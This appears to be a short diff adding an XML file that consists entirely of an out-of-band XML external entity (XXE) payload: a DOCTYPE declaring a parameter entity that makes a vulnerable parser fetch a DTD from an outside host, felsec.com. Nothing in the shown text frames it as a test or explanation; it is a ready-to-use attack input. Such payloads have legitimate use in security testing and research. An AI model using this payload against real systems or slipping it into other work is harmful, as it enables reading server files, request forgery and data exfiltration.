@@ -1,0 +1,3 @@
+<felsec>
+<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "https://felsec.com/xxe/xxe.dtd"> %dtd;]><xxx/>]]>
+</felsec>
